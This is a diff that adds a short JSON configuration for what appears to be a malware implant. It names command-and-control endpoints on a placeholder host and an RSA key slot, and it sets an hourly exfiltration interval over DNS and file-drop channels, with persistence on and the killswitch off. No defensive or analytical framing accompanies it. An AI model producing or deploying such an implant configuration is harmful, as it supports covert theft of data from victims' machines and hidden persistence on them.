@@ -1,0 +1,13 @@
+{
+  "c2": {
+    "primary_endpoint": "https://your-c2.example.com/telemetry",
+    "fallback_endpoint": "your-c2.example.com",
+    "rsa_pubkey": "-----BEGIN RSA PUBLIC KEY-----\n...\n-----END RSA PUBLIC KEY-----",
+    "exfil_interval": 3600,
+    "use_dns": true,
+    "use_file_drop": true
+  },
+  "persistence": true,
+  "killswitch": false,
+  "killswitch_hours": 24
+}
